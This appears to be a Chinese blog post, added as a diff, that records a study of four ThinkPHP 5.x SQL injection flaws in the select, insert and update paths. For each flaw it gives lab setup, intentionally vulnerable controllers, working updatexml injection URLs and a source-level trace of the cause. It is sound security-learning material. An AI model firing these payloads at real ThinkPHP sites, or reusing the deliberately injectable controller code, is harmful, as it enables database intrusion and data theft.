@@ -1,0 +1,307 @@
+<hr>
+<p>title: ThinkPHP 代码审计学习记录<br>date: 2022-12-29 19:30:56<br>tags: </p>
+<ul>
+<li>learn</li>
+<li>ThinkPHP</li>
+</ul>
+<p>categories:</p>
+<ul>
+<li>Audit</li>
+<li>PHP</li>
+</ul>
+<hr>
+<h1 id="Thinkphp-5-0-x-SQL注入-select方法"><a href="#Thinkphp-5-0-x-SQL注入-select方法" class="headerlink" title="Thinkphp 5.0.x SQL注入-select方法"></a>Thinkphp 5.0.x SQL注入-select方法</h1><h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>官方不认为是漏洞，因在特定模式 <code>exp</code> 下执行 <strong>SQL</strong> 语句，未经任何过滤处理导致注入</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li><p>ThinkPHP5 全版本</p>
+</li>
+<li><p>需要开启 <strong>Debug</strong> 页面</p>
+</li>
+</ul>
+<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拉取项目</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.0.10 thinkphp_5.0.10
+</code></pre>
+<p>修改 <code>composer.json</code> 文件的 <code>require</code> 字段设置成如下，然后再执行 <code>composer update</code></p>
+<pre><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.0.10&quot;
+},
+</code></pre>
+<p>修改 <code>application/index/controller/Index.php</code> 文件内容</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username&#39;);
+        $result = db(&#39;users&#39;)-&gt;where(&#39;username&#39;, &#39;exp&#39;, $username)-&gt;select();
+        return &#39;select success&#39;;
+    }
+}
+</code></pre>
+<p>创建 <code>users</code> 表</p>
+<pre><code class="sql">create database tpdemo;
+use tpdemo;
+create table users(
+    id int primary key auto_increment,
+    username varchar(50) not null
+);
+insert into users(id,username) values(1,&#39;admin&#39;);
+</code></pre>
+<p>根据相关内容修改 <code>database.php</code> 文件</p>
+<p><img src="1.png"></p>
+<p>在 <code>config.php</code> 文件中开启 <code>app_debug</code>  和 <code>app_app_trace</code></p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>http://127.0.0.1/thinkphp/public/index.php/index/index/index?username=)%20union%20select%20updatexml(1,concat(0x7e,user(),0x7e),1)%23
+</code></pre>
+<p><img src="2.png"></p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打断点开始调试，首先进入 <code>get()</code> 方法，在 <code>thinkphp/library/think/Request.php</code> 中</p>
+<p><img src="3.png"></p>
+<p><code>get()</code> 方法中对传入的 <code>$name</code> 进行判断，如果是数组则在第 673 行处合并后输出，进入 <code>input()</code> 方法</p>
+<p><img src="4.png"></p>
+<p><code>input()</code>  方法对参数 <code>$name</code> 分为 <code>/</code>  和 <code>.</code>  两种情况进行处理</p>
+<p><img src="5.png"></p>
+<p>当判断参数 <code>$data</code>  不是数组时，进入 <code>filterValue()</code> 方法</p>
+<p><img src="6.png"></p>
+<p>继续跟进，进入 <code>filterExp()</code> 方法</p>
+<p><img src="7.png"></p>
+<p>使用正则过滤查询关键字，然后在参数 <code>$value</code> 后加上空格，最后再返回数据回到 <code>application/index/controller/Index.php</code> 文件中</p>
+<p><img src="8.png"></p>
+<p>先进入 <code>where()</code> 方法，在 <code>thinkphp/library/think/db/Query.php</code> 中</p>
+<p><img src="9.png"></p>
+<p><strong>where</strong> 部分经过 <code>parseWhereExp()</code> 方法处理后返回，继续调用 <code>select()</code> 方法</p>
+<p><img src="10.png"></p>
+<p>在 <code>select()</code> 方法中，重点在第 2306 行处生成 <strong>SQL</strong> 查询语句， <code>$options</code> 参数的生成在第 2286 行，通过 <code>parseExpress()</code>  函数分析表达式获取到表名信息、where 查询后的内容</p>
+<p><img src="11.png"></p>
+<p> 继续跟进 ，调用 <code>BUilder</code> 类中 <code>select()</code>  方法，文件在 <code>thinkphp/library/think/db/Builder.php</code> </p>
+<p><img src="12.png"></p>
+<p>在 <code>select()</code> 方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <code>%WHERE%</code> 的变量中存在用户输入的数据，跟进 <code>parseWhere()</code> 方法</p>
+<p><img src="13.png"></p>
+<p>使用 <code>buildWhere()</code> 方法生成查询条件 <strong>SQL</strong> 语句，继续跟进该方法</p>
+<p><img src="14.png"></p>
+<p>跟进 <code>parseWhereItem()</code> 方法查看 where子单元分析</p>
+<p><img src="15.png"></p>
+<p>当操作符为 <code>exp</code> 时，会将来自用户的数据直接拼接进为 <strong>SQL</strong> 语句，导致产生 <strong>SQL注入漏洞</strong>，所以此时的语句为</p>
+<pre><code>( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# )
+</code></pre>
+<p>回到 <code>Builder</code> 类中的 <code>select()</code> 方法，组合成完整的 <strong>SQL</strong> 语句</p>
+<pre><code class="sql">SELECT * FROM `users` WHERE  ( `username` ) union select updatexml(1,concat(0x7e,user(),0x7e),1)# ) 
+</code></pre>
+<p>最后返回到 <code>Query</code> 类中 <code>select()</code> 方法调用 <code>query()</code> 执行查询</p>
+<h1 id="Thinkphp-5-0-10-SQL注入-select方法"><a href="#Thinkphp-5-0-10-SQL注入-select方法" class="headerlink" title="Thinkphp 5.0.10 SQL注入-select方法"></a>Thinkphp 5.0.10 SQL注入-select方法</h1><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseWhereItem</strong> 方法中，由于程序没有对数据进行很好的过滤，直接将数据拼接进 <strong>SQL</strong> 语句。<strong>Request</strong> 类的 <strong>filterExp</strong> 方法漏过滤 <strong>NOT LIKE</strong> 关键字，最终导致 <strong>SQL注入漏洞</strong> 的产生。该注入影响小于 <strong>5.0.10</strong> 版本，高版本已经将 <code>NOT LIKE</code> 添加到 <code>filterExp()</code> 方法中进行过滤。</p>
+<h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li>ThinkPHP &lt;= 5.0.10</li>
+</ul>
+<h2 id="环境搭建-1"><a href="#环境搭建-1" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拉取项目</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.0.10 thinkphp_5.0.10
+</code></pre>
+<p>修改 <code>composer.json</code> 文件的 <code>require</code> 字段设置成如下，然后再执行 <code>composer update</code></p>
+<pre><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.0.10&quot;
+},
+</code></pre>
+<p>修改 <code>application/index/controller/Index.php</code> 文件内容</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        $result = db(&#39;users&#39;)-&gt;where([&#39;username&#39; =&gt; $username])-&gt;select();
+        var_dump($result);
+    }
+}
+</code></pre>
+<p>创建 <code>users</code> 表</p>
+<pre><code class="sql">create database tpdemo;
+use tpdemo;
+create table users(
+    id int primary key auto_increment,
+    username varchar(50) not null
+);
+insert into users(id,username) values(1,&#39;admin&#39;);
+</code></pre>
+<p>根据相关内容修改 <code>database.php</code> 文件</p>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>http://127.0.0.1/thinkphp/public/index.php/index/index/index?username[0]=not%20like&amp;username[1][0]=%%&amp;username[1][1]=aa&amp;username[2]=)%20union%20select%201,user()%23
+</code></pre>
+<p><img src="16.png"></p>
+<h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打断点开始调试，先进入到 <code>thinkphp/library/think/Request.php</code> 中的 <code>get()</code> 方法中</p>
+<p><img src="17.png"></p>
+<p>判断 <code>$name</code> 参数类型，继续进入 <code>input()</code> 方法中</p>
+<p><img src="18.png"></p>
+<p>在 <code>input()</code> 方法中，因为这次是数组数据，判断 <code>$data</code> 类型后进入 <code>if</code> 语句中</p>
+<p><img src="19.png"></p>
+<p>使用 <code>array_walk_recursive()</code> 函数对 <code>$data</code> 中内容进行过滤，进入 <code>filterValue()</code> 方法</p>
+<p><img src="20.png"></p>
+<p>继续进入 <code>filterExp()</code> 中，查看有哪些过滤字符</p>
+<p><img src="21.png"></p>
+<p>使用正则过滤，有对 <code>NOTLIKE</code> 进行过滤，但是忽略了 <code>NOT LIKE</code> ，回到 <code>application/index/controller/Index.php</code> 文件</p>
+<p><img src="22.png"></p>
+<p>先调用 <code>Query</code>  类中的 <code>where()</code> 方法，然后通过 <code>parseWhereExp()</code> 分析查询表达式</p>
+<p><img src="23.png"></p>
+<p>最后返回 <code>index.php</code> 并继续调用 <code>select()</code> 方法构建 <strong>SQL</strong> 语句</p>
+<p><img src="24.png"></p>
+<p>继续跟进 ，调用 <code>BUilder</code> 类中 <code>select()</code>  方法，文件在 <code>thinkphp/library/think/db/Builder.php</code> </p>
+<p><img src="25.png"></p>
+<p>在 <code>select()</code>  方法中，程序会对 <strong>SQL</strong> 语句模板用变量填充，其中用来填充 <code>%WHERE%</code> 的变量存在用户输入的数据，跟进 <code>parseWhere()</code> 方法</p>
+<p><img src="26.png"></p>
+<p>数据传入 <code>buildWhere()</code> 方法，继续跟进，生成查询表达式 <strong>SQL</strong> 语句</p>
+<p><img src="27.png"></p>
+<p>跟进 <code>parseWhereItem()</code> 方法，对 where子单元分析</p>
+<p><img src="28.png"></p>
+<p>第 305 行使用 <code>list()</code>  获取 <code>$val</code> 中的值，分别赋值给 <code>$exp = $val[0] = NOT LIKE</code> 和 <code>$value = $val[1] = array(&#39;%%&#39;, &#39;aa&#39;)</code> ，当程序走到第 357 行判断 <code>$exp</code> 的值是否为 <code>NOT LIKE</code> 。由于在 <code>Request</code> 类中的 <code>filterExp()</code> 方法忽略掉对 <code>NOT LIKE</code> 的过滤，导致用户输入的内容可控，进入该 <code>elseif()</code> 分支中</p>
+<p><img src="29.png"></p>
+<p><code>$value</code> 为数组，进入 <code>if</code> 分支，在第 363 行判断是否存在 <code>$val[2]</code> ，如果存在则赋值给 <code>$logic</code> ，即 </p>
+<pre><code class="php">$logic = &quot;) union select 1,user()#&quot;
+</code></pre>
+<p>然后在 364 行处使用 <code>implode()</code> 将 <code>$array</code> 和 <code>$logic</code> 组合为字符串返回给 <code>$whereStr</code></p>
+<pre><code class="php">$whereStr = &quot;(`username` NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# `username` NOT LIKE &#39;aa&#39;)&quot;
+</code></pre>
+<p>最终  <code>Builder</code> 类中 <code>select()</code>  方法生成的完整查询 <strong>SQL</strong> 语句为</p>
+<pre><code class="php">$sql = &quot;SELECT * FROM `users` WHERE  (`username` NOT LIKE &#39;%%&#39; ) UNION SELECT 1,USER()# `username` NOT LIKE &#39;aa&#39;) &quot;
+</code></pre>
+<p>最后返回到 <code>Query</code> 类中 <code>select()</code> 方法调用 <code>query()</code> 执行查询</p>
+<h2 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h2><p>拉取 <code>ThinkPHP 5.0.9</code> 版本，复现该漏洞，漏洞仍存在</p>
+<p><img src="30.png"></p>
+<p>在 <code>thinkphp/library/think/db/Builder.php#324</code> 处使用 <code>in_array()</code> 函数判断 <code>exp</code> 数组中是否存在 <code>not like</code></p>
+<p><img src="31.png"></p>
+<p>实际上<code>$exp</code> 是检查数组的值而不是键名</p>
+<p><img src="32.png"></p>
+<p>所以小于 <strong>5.0.10</strong> 版本同样存在漏洞</p>
+<h1 id="Thinkphp-5-x-SQL注入-insert方法"><a href="#Thinkphp-5-x-SQL注入-insert方法" class="headerlink" title="Thinkphp 5.x SQL注入-insert方法"></a>Thinkphp 5.x SQL注入-insert方法</h1><h2 id="漏洞概述-2"><a href="#漏洞概述-2" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>Builder</strong> 类的 <strong>parseData</strong> 方法中。由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生。</p>
+<h2 id="影响版本-2"><a href="#影响版本-2" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li><strong>5.0.13 &lt;= ThinkPHP &lt;= 5.0.15</strong></li>
+<li><strong>5.1.0 &lt;= ThinkPHP &lt;= 5.1.5</strong></li>
+<li>需要开启 <strong>Debug</strong> 页面</li>
+</ul>
+<h2 id="环境搭建-2"><a href="#环境搭建-2" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拉取项目</p>
+<pre><code>composer create-project --prefer-dist topthink/think=5.0.15 thinkphp_5.0.15
+</code></pre>
+<p>修改 <code>composer.json</code> 文件的 <code>require</code> 字段设置成如下，然后再执行 <code>composer update</code></p>
+<pre><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.4.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.0.15&quot;
+}
+</code></pre>
+<p>修改 <code>application/index/controller/Index.php</code> 文件内容</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        db(&#39;users&#39;)-&gt;insert([&#39;username&#39; =&gt; $username]);
+        return &#39;Update success&#39;;
+    }
+}
+</code></pre>
+<p>创建 <code>users</code> 表</p>
+<pre><code class="sql">create database tpdemo;
+use tpdemo;
+create table users(
+    id int primary key auto_increment,
+    username varchar(50) not null
+);
+</code></pre>
+<p>根据相关内容修改 <code>database.php</code> 文件，在 <code>config.php</code> 文件中开启 <code>app_debug</code>  和 <code>app_app_trace</code></p>
+<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>http://127.0.0.1/thinkphp/public/index.php/index/index/index?username[0]=inc&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
+</code></pre>
+<p><img src="33.png"></p>
+<h2 id="漏洞分析-2"><a href="#漏洞分析-2" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打断点开始调试</p>
+<p><img src="34.png"></p>
+<p>第 18 行通过 <code>request()</code> 助手函数的 <code>get()</code> 方法获取 <code>username</code> 数据，直接跟进第 19 行处 <code>insert()</code> 方法，文件位于 <code>thinkphp/library/think/db/Query.php</code> </p>
+<p><img src="35.png"></p>
+<p>第 2082 行中 <code>parseExpress()</code> 方法获取配置信息，在 2085 行调用 <code>$this-&gt;builder-&gt;insert()</code> 方法生成 <code>$sql</code> 语句，继续跟进 <code>insert()</code> 方法，文件位于 <code>thinkphp/library/think/db/Builder.php</code></p>
+<p><img src="36.png"></p>
+<p>在第 721 行调用 <code>parseDate()</code> 方法处理传入的数据，跟进查看</p>
+<p><img src="37.png"></p>
+<p>第 101 行遍历传入的 <code>$data</code> 数据，将单元的值赋值给 <code>$val</code> 数组，跟进到第 114 行处通过 <code>switch</code> 判断 <code>$val[0]</code> 参数，在 <strong>payload</strong> 输入为 <code>inc</code> ，进入 <code>inc</code> 分支中，，跟进 <code>parseKey()</code> 方法</p>
+<p><img src="38.png"></p>
+<p>在 <code>parseKey()</code> 方法中，不会对传入的内容进行任何过滤，只是用来解析处理数据，传入的 <code>$val[1]</code> 不受影响，回到 <code>parseDate()</code>  中</p>
+<p><img src="39.png"></p>
+<p>数据拼接完后回到 <code>insert()</code> 方法中，在 728-736 行中替换字符串将 <code>$data</code> 中的数据填充到 <strong>SQL</strong> 语句中，最后在执行时出发报错注入</p>
+<pre><code class="sql">$sql = &quot; INSERT INTO `users` (`username`) VALUES (updatexml(1,concat(0x7e,user(),0x7e),1)+1) &quot;
+</code></pre>
+<p><img src="40.png"></p>
+<p>在分析过程中，<code>parseDate()</code> 方法中一共存在 3 种 <strong>case</strong> 语句</p>
+<p><img src="41.png"></p>
+<p>理论上也可以使用 <code>exp</code> 和 <code>dec</code> 来构造 <strong>SQL</strong> 语句，但是在实际测试中发现，<code>exp</code> 会在 <code>thinkphp/library/think/Request.php#filterValue</code> 中被处理，后面增加空格，那么到 <code>parseDate()</code> 中不符合 <strong>case</strong> 内容，无法注入</p>
+<p><img src="42.png"></p>
+<p>但 <code>dec</code> 不受影响，所以也可以造成注入漏洞</p>
+<pre><code>http://tp.cn/index.php/index/index/index?username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1
+</code></pre>
+<p><img src="43.png"></p>
+<h1 id="Thinkphp-5-1-x-SQL注入-update方法"><a href="#Thinkphp-5-1-x-SQL注入-update方法" class="headerlink" title="Thinkphp 5.1.x SQL注入-update方法"></a>Thinkphp 5.1.x SQL注入-update方法</h1><h2 id="漏洞概述-3"><a href="#漏洞概述-3" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>漏洞存在于 <strong>Mysql</strong> 类的 <strong>parseArrayData</strong> 方法中由于程序没有对数据进行很好的过滤，将数据拼接进 <strong>SQL</strong> 语句，导致 <strong>SQL注入漏洞</strong> 的产生</p>
+<h2 id="影响版本-3"><a href="#影响版本-3" class="headerlink" title="影响版本"></a>影响版本</h2><ul>
+<li><strong>5.1.6 &lt;= ThinkPHP &lt;= 5.1.7</strong></li>
+<li>部分 <strong>5.1.8</strong> 存在</li>
+<li>需要开启 <strong>Debug</strong> 页面</li>
+</ul>
+<h2 id="环境搭建-3"><a href="#环境搭建-3" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>拉取项目</p>
+<pre><code>composer create-project --prefer-dist topthink/think thinkphp_5.1.7
+</code></pre>
+<p>修改 <code>composer.json</code> 文件的 <code>require</code> 字段设置成如下，然后再执行 <code>composer update</code></p>
+<pre><code>&quot;require&quot;: {
+    &quot;php&quot;: &quot;&gt;=5.6.0&quot;,
+    &quot;topthink/framework&quot;: &quot;5.1.7&quot;
+}
+</code></pre>
+<p>修改 <code>application/index/controller/Index.php</code> 文件内容</p>
+<pre><code class="php">&lt;?php
+namespace app\index\controller;
+
+class Index
+{
+    public function index()
+    {
+        $username = request()-&gt;get(&#39;username/a&#39;);
+        db(&#39;users&#39;)-&gt;where([&#39;id&#39; =&gt; 1])-&gt;update([&#39;username&#39; =&gt; $username]);
+        return &#39;Update success&#39;;
+    }
+}
+</code></pre>
+<p>创建 <code>users</code> 表</p>
+<pre><code class="sql">create database tpdemo;
+use tpdemo;
+create table users(
+    id int primary key auto_increment,
+    username varchar(50) not null
+);
+insert into users(id,username) values(1,&#39;admin&#39;);
+</code></pre>
+<p>根据相关内容修改 <code>config/database.php</code> 文件，在 <code>config/app.php</code> 文件中开启 <code>app_debug</code> 和 <code>app_app_trace</code></p>
+<h2 id="漏洞复现-3"><a href="#漏洞复现-3" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><pre><code>http://127.0.0.1/thinkphp/public/index.php/index/index/index?username[0]=point&amp;username[1]=1&amp;username[2]=updatexml(1,concat(0x7e,user(),0x7e),1)^&amp;username[3]=0
+</code></pre>
+<p><img src="44.png"></p>
+<h2 id="漏洞分析-3"><a href="#漏洞分析-3" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>打断点开始调试</p>
+<p><img src="45.png"></p>
+<p>直接进入到 <code>update()</code> 方法中，位于 <code>thinkphp/library/think/db/Query.php</code> </p>
+<p><img src="46.png"></p>
+<p>继续跟进进入 <code>update()</code> 方法，位于 <code>thinkphp/library/think/db/Connection.php</code> 中</p>
+<p><img src="47.png"></p>
+<p>直接查看 <code>UPDATE SQL</code> 语句生成，在 <code>thinkphp/library/think/db/Builder.php</code> 中 1134 行</p>
+<p><img src="48.png"></p>
+<p>进入 <code>parseData()</code>  数据分析方法中</p>
+<p><img src="49.png"></p>
+<p>在第 115 行处遍历 <code>$data</code> 赋值 <code>$key</code> 和 <code>$val</code> 参数，到第 128 行处判断 <code>$key</code> 是否存在 <code>-&gt;</code> ，继续走到第 138 行符合判断条件。取 <code>$val[0]</code> 为 <code>point</code> 在 <code>switch</code> 中判断，进入 <code>default</code> 条件里，跟进 <code>parseArrayData()</code> 函数中解析数组数据，位于 <code>thinkphp/library/think/db/builder/Mysql.php</code> </p>
+<p><img src="50.png"></p>
+<p>函数中没有任何过滤，直接拼接为sql语句</p>
+<pre><code>$result = $fun . &#39;(\&#39;&#39; . $point . &#39;(&#39; . $value . &#39;)\&#39;)&#39;;
+</code></pre>
+<p>参数均可控，实际上语句为</p>
+<pre><code>$result = $data[2] . &#39;(\&#39;&#39;. $data[3].&#39;(&#39;.$data[1].&#39;)\&#39;)&#39;;
+</code></pre>
+<p>SQL语句为</p>
+<pre><code>UPDATE `users`  SET `username` = $data[2](&#39;$data[3]($data[1])&#39;)  WHERE  `id` = :where_AND_id
+</code></pre>
+<p>填充<code>$data</code> </p>
+<p><img src="51.png"></p>
+<p>最后得到完整的 sql语句</p>
+<h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p><a href="https://www.cnblogs.com/R0ser1/p/15093687.html">ThinkPHP5.x注入漏洞学习</a></p>
+<p><a href="https://www.cnblogs.com/yokan/p/16102644.html">ThinkPHP v5.0.10代码审计</a></p>
+<p><a href="https://github.com/Mochazz/ThinkPHP-Vuln/">ThinkPHP-Vuln</a></p>
